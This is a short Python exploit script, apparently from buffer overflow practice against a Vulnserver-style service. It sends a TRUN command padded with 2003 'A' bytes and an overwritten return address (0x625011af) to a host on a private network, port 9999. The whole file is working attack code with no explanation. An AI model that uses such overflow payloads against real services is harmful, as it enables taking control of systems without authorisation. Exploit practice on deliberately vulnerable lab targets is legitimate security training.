#!/usr/bin/python3

import sys
import socket

# 625011af

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"

ip = '192.168.253.136'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
payload = b'TRUN /.:/' + shellcode
s.send((payload))
s.close()